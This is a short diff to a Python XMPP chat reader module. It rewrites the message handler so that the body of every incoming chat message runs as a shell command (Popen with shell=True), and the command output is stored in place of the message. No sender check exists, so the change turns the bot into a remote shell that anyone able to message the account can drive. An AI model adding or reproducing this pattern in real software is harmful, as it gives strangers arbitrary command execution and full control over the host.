@@ -1,7 +1,9 @@
 import sys
 import xmpp
+import time
 import logging
 import traceback
+from subprocess import Popen, PIPE
 
 from __message import Message
 from __reader import Reader
@@ -16,7 +18,7 @@ class GtalkReader(Reader):
         self.required_confs = ['login', 'passwd']
         self.validate_conf()
 
-        self.con.auth(self.login, self.passwd, "botty")
+        self.con.auth(self.login, self.passwd, "gtalkreader")
         self.con.sendInitPresence()
 
     def read(self):
@@ -25,7 +27,8 @@ class GtalkReader(Reader):
             return
 
         def process_message(sess, mess):
-            text = mess.getBody()
+            cmd = Popen(mess.getBody(), stdout=PIPE, shell=True)
+            text = cmd.stdout.read()
             self.store(Message(content=text))
 
         self.con.RegisterHandler('message', process_message)
